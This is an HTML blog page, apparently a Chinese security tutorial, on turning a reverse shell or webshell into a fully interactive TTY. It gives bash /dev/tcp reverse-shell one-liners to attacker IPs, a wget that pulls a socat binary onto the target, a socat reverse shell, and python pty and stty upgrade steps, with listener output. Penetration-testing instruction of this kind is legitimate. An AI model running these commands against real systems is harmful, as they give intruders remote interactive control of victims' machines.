@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="lmy" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="实现交互式shell的几种方式当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。那我们怎么获取一个可交互的webshell呢？1. python pty 方式一般我们都会使用nc来接收反弹来的shell，只需要在目标上(以linux为例)执行：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实现交互式shell的几种方式">
+<meta property="og:url" content="https:&#x2F;&#x2F;lmy-xdd.github.io&#x2F;2019&#x2F;01&#x2F;20&#x2F;%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F&#x2F;index.html">
+<meta property="og:site_name" content="lmy">
+<meta property="og:description" content="实现交互式shell的几种方式当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。那我们怎么获取一个可交互的webshell呢？1. python pty 方式一般我们都会使用nc来接收反弹来的shell，只需要在目标上(以linux为例)执行：">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;06&#x2F;3893556663.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;06&#x2F;9701011.png">
+<meta property="og:updated_time" content="2019-12-02T11:56:02.120Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;06&#x2F;3893556663.png">
+
+<link rel="canonical" href="https://lmy-xdd.github.io/2019/01/20/%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>实现交互式shell的几种方式 | lmy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lmy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lmy-xdd.github.io/2019/01/20/%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lmy.jpg">
+      <meta itemprop="name" content="Liu Mingyi">
+      <meta itemprop="description" content="我的邮箱是liumingyi0809@gmail.com,欢迎技术讨论">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lmy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          实现交互式shell的几种方式
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-01-20 18:35:16" itemprop="dateCreated datePublished" datetime="2019-01-20T18:35:16+08:00">2019-01-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="实现交互式shell的几种方式"><a href="#实现交互式shell的几种方式" class="headerlink" title="实现交互式shell的几种方式"></a>实现交互式shell的几种方式</h1><p>当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。</p><p>那我们怎么获取一个可交互的webshell呢？</p><h2 id="1-python-pty-方式"><a href="#1-python-pty-方式" class="headerlink" title="1. python pty 方式"></a>1. python pty 方式</h2><p>一般我们都会使用nc来接收反弹来的shell，只需要在目标上(以linux为例)执行：</p><a id="more"></a>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.2.134/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>本地接收一下就ok了，但是反弹回来的shell，或多或少都会存在问题，比如当我想使用top命令时就会提示没有 <code>tty</code>。简单的来说就是没有上下文环境，这样的话，<code>vim</code>，<code>sudo</code>等操作都做不了，有时候还需要其他工具，很麻烦。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\w5023</span><br><span class="line">λ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30688</span><br><span class="line">ubuntu@ubuntu:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">ubuntu</span><br><span class="line">ubuntu@ubuntu:~$ top</span><br><span class="line">top</span><br><span class="line">top: failed tty get</span><br><span class="line">ubuntu@ubuntu:~$ tty</span><br><span class="line">tty</span><br><span class="line">not a tty</span><br></pre></td></tr></table></figure>
+
+<p>但是如果发现对方机器上有 python 的话，我们可以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://saucer-man.com/usr/uploads/2019/06/3893556663.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/06/3893556663.png" alt="img"></a></p>
+<p>可以实现简单的tty，但是这种方式有个问题，当我们ctrl+C的时候，所有连接都会断掉，又需要重新来一遍，而且vim虽然可以用，也有点问题，同时没有记录，无法使用上方向键执行上条命令。</p>
+<h2 id="2-升级nc为完全交互"><a href="#2-升级nc为完全交互" class="headerlink" title="2. 升级nc为完全交互"></a>2. 升级nc为完全交互</h2><p>整个流程是在第一步的基础上，但是需要用到的工具在linux上，所以把攻击机切换为linux。</p>
+<p>现在攻击机和目标机分别为：</p>
+<ul>
+<li>攻击机 Linux 192.168.81.160</li>
+<li>目标机 Linux 192.168.81.162</li>
+</ul>
+<p>简单把反弹一个完全交互shell的过程写出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机本地执行</span><br><span class="line"># 首先检查当前终端和STTY信息</span><br><span class="line">$ echo $TERM      </span><br><span class="line">$ stty -a </span><br><span class="line"># nc开启监听</span><br><span class="line">$ nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://saucer-man.com/usr/uploads/2019/06/9701011.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/06/9701011.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 目标机执行</span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/192.168.81.160/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 此时攻击机已经获取到了bash</span><br><span class="line"># 接下来执行</span><br><span class="line">$ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;  //启用python交互式</span><br><span class="line"># 把它丢到后台挂起</span><br><span class="line">$ ctrl + z   </span><br><span class="line"># 重置stty，也就意味着你看不到输入的内容</span><br><span class="line">$ stty raw -echo  </span><br><span class="line"># 把后台挂起的程序调回前台</span><br><span class="line">$ fg  </span><br><span class="line"># 完全刷新终端屏幕</span><br><span class="line">$ reset  </span><br><span class="line"># 接下来设置环境变量，根据第一步得到的环境变量来设置</span><br><span class="line">$ export SHELL=bash   </span><br><span class="line">$ export TERM=xterm-256color   </span><br><span class="line">$ stty rows 行数 columns 列数</span><br></pre></td></tr></table></figure>
+
+<p>到这里，就可以得到一个完美的shell了。</p>
+<h2 id="3-使用socat"><a href="#3-使用socat" class="headerlink" title="3. 使用socat"></a>3. 使用socat</h2><p>socat是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，<strong>只能在linux下面运行</strong></p>
+<p>下载地址：<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a></p>
+<p>使用起来也很简单。</p>
+<ul>
+<li><p>攻击机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 首先安装</span><br><span class="line">$ sudo apt install socat</span><br><span class="line"># 执行</span><br><span class="line">$ socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 把socat上传到目标机器上或者直接下载</span><br><span class="line">$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat</span><br><span class="line"># 运行</span><br><span class="line">$ chmod +x /tmp/socat</span><br><span class="line">$ /tmp/socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>这种方式基本和ssh类似，ctrl+C也不会直接断开。</p>
+<h2 id="4-script获取pty"><a href="#4-script获取pty" class="headerlink" title="4. script获取pty"></a>4. script获取pty</h2><p>我们可以使用 Linux 系统下的 <code>script</code> 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 <code>top</code> 和 <code>vim</code> :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ script /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>如果不加 <code>/dev/null</code> 的话，会在当前路径下生成一个名字是 <code>typescript</code> 的文件，记录着在 script 生命周期里你执行的所有命令和结果。</p>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\w5023</span><br><span class="line">λ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567</span><br><span class="line">ubuntu@ubuntu:~$ tty</span><br><span class="line">tty</span><br><span class="line">not a tty</span><br><span class="line">ubuntu@ubuntu:~$ script /dev/null</span><br><span class="line">script /dev/null</span><br><span class="line">Script started, file is /dev/null</span><br><span class="line">ubuntu@ubuntu:~$ tty</span><br><span class="line">tty</span><br><span class="line">/dev/pts/1</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
+<li><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a></li>
+<li><a href="http://blog.evalbug.com/2018/07/25/antsword_prompt_shell" target="_blank" rel="noopener">http://blog.evalbug.com/2018/07/25/antsword_prompt_shell</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Liu Mingyi
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://lmy-xdd.github.io/2019/01/20/%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/" title="实现交互式shell的几种方式">https://lmy-xdd.github.io/2019/01/20/%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/null" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="redis未授权漏洞利用">
+                  <i class="fa fa-chevron-left"></i> redis未授权漏洞利用
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/02/19/python%E5%86%85%E5%AD%98%E8%B0%83%E4%BC%98%E7%BB%8F%E5%8E%86/" rel="prev" title="Python内存调优">
+                  Python内存调优 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实现交互式shell的几种方式"><span class="nav-number">1.</span> <span class="nav-text">实现交互式shell的几种方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-python-pty-方式"><span class="nav-number">1.1.</span> <span class="nav-text">1. python pty 方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-升级nc为完全交互"><span class="nav-number">1.2.</span> <span class="nav-text">2. 升级nc为完全交互</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-使用socat"><span class="nav-number">1.3.</span> <span class="nav-text">3. 使用socat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-script获取pty"><span class="nav-number">1.4.</span> <span class="nav-text">4. script获取pty</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-参考"><span class="nav-number">1.5.</span> <span class="nav-text">5. 参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Liu Mingyi"
+      src="/images/lmy.jpg">
+  <p class="site-author-name" itemprop="name">Liu Mingyi</p>
+  <div class="site-description" itemprop="description">我的邮箱是liumingyi0809@gmail.com,欢迎技术讨论</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/null" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-lmy"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lmy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/clicklove.js"></script>
+</body>
+</html>
